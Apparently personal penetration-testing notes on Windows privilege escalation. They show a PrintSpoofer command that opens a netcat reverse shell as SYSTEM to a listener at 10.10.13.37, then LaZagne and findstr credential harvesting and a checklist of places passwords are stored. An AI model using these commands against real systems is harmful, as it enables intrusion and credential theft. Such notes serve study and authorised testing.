## delete

# Enumeration
```powershell
> whoami /priv
```


# Vulnerabilities
## Rogue Potato

## Juicy/Lovely Potato

## [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
Service Account (IIS/MSSQL) got privilge SeImpersonatePrivilege 

Create a reverse shell:
```powershell
C:\TOOLS>PrintSpoofer.exe -c "C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK

Netcat listener:

C:\TOOLS>nc.exe -l -p 1337
Microsoft Windows [Version 10.0.19613.1000]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
nt authority\system
```




# Credential Harvesting
## Key Terms to Search

Passwords 	Passphrases 	Keys
Username 	User account 	Creds
Users 	Passkeys 	Passphrases
configuration 	dbcredential 	dbpassword
pwd 	Login 	Credentials

## Search Tools
With access to the GUI, it is worth attempting to use Windows Search to find files on the target using some of the keywords mentioned above.

By default, it will search various OS settings and the file system for files & applications containing the key term entered in the search bar.


### Running Lazagne All
We can also take advantage of third-party tools like [Lazagne](https://github.com/AlessandroZ/LaZagne) to quickly discover credentials that web browsers or other installed applications may insecurely store. It would be beneficial to keep a standalone copy of Lazagne on our attack host so we can quickly transfer it over to the target. Lazagne.exe will do just fine for us in this scenario.

```powershell
> start lazagne.exe all
```

### Using findstr
We can also use findstr to search from patterns across many types of files. Keeping in mind common key terms, we can use variations of this command to discover credentials on a Windows target:

```powershell
> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
> findstr /si "password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

## Additional Considerations
Here are some other places we should keep in mind when credential hunting:
    - Passwords in Group Policy in the SYSVOL share
    - Passwords in scripts in the SYSVOL share
    - Password in scripts on IT shares
    - Passwords in web.config files on dev machines and IT shares
    - unattend.xml
    - Passwords in the AD user or computer description fields
    - KeePass databases --> pull hash, crack and get loads of access.
    - Found on user systems and shares
    - Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint

